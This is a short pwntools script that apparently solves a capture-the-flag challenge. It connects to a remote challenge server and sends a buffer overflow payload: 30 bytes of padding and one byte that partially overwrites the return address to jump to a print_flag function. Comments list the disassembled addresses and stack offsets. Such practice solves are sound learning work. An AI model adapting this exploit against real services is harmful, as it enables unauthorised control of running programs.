from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3007)
# e = ELF("/Users/yee/Code/Python/offset")

# 0x000006d8 print_flag
# 0x000006ad two
# var char *dest @ ebp-0x2a
# var int32_t var_ch @ ebp-0xc
# var int32_t var_4h @ ebp-0x4

r.recvline()

payload = b'A' * 30
payload += b'\xd8'

r.sendline(payload)

r.interactive()